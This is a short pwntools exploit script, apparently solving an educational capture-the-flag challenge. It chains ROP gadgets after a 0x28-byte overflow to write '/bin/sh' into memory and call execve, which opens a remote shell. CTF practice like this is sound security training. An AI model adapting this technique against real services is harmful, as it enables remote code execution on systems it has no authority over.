from pwn import *
r=remote("edu-ctf.zoolab.org",10003)
# r=process("chal")
context.arch='amd64';context.terminal=['tmux','splitw','-h']
gdb.attach(r, gdbscript='b *0x401798   ')
rsi=0x409e6e
rdi=0x401e3f
rax=0x447b27
rdx=0x47ed0b
sh=b"/bin/sh\x00"
payload=b'A'*0x28
# pop rsi ; ret
payload+=p64(rsi)
payload+=p64(0)
# pop rdi ; ret
payload+=p64(rdi)
payload+=p64(0)
#  pop rdx ; pop rbx ; ret
payload+=p64(rdx)
payload+=sh
payload+=p64(0)
# 尋找記憶體寫入檔案路徑
payload+=p64(rax)
payload+=p64(0x4c5000)
# 0x000000000046b625 : adc al, 0x90 ; mov qword ptr [rax], rdx ; xor eax, eax ; ret
payload+=p64(0x46b625)
# 將bin/sh所在的地方放入rdi
payload+=p64(rdi)
payload+=p64(0x4c5091)
#  pop rdx ; pop rbx ; ret
payload+=p64(rdx)
payload+=p64(0)
payload+=p64(0)

#rax
payload+=p64(rax)
payload+=p64(59)
# syscall
payload+=p64(0x401bf4)

r.sendafter('show me rop\n> ',payload)

r.interactive()
